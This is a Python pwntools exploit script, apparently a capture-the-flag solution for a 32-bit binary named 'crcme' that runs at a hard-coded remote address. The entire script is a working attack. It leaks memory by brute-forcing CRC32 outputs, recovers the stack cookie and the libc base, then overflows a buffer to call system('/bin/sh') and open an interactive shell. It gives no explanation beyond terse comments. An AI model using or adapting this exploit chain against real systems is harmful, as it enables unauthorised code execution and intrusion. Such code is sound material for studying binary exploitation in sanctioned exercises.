from pwn import *
from zlib import crc32

context.log_level = 'DEBUG'

local = False

if local:
    r = process('./crcme_8416479dcf3a74133080df4f454cd0f76ec9cc8d')
    pause()
else:
    r = remote('69.90.132.40', 4002)

r.recvuntil(': ')

def leak(addr):
    val = ""

    for i in range(4):
        r.sendline('1') # compute CRC

        r.recvuntil('data: ')

        r.sendline(str(i+1)) # get the crc of the first i bytes
        r.recvuntil(': ')
        r.sendline('A'*100 + p32(addr))

        r.recvuntil('is: ')
        crc = int(r.recvuntil('\n')[:-1], 16)

        for c in map(chr, range(256)):
            if crc32(val+c) & 0xffffffff == crc:
                val += c
                break

        r.recvuntil(':')

    return u32(val)

stack_addr = leak(0x0804a040) # there's a stack variable in the `size` bss
print "Stack:", hex(stack_addr)

cookie_addr = stack_addr + 0x6c

cookie = leak(cookie_addr)

print "Stack cookie:", hex(cookie)

libc_gets = leak(0x08049FDC)

if local:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    libc = ELF('/lib32/libc.so.6')

libc.address = libc_gets - libc.symbols['gets']

print "libc base:", hex(libc.address)

r.sendline('1')
r.recvuntil('data: ')
r.sendline('A'*0x28 + p32(cookie) + 'B'*12 + p32(libc.symbols['system']) + p32(0) + p32(stack_addr-8) + '/bin/sh\x00')

r.interactive()
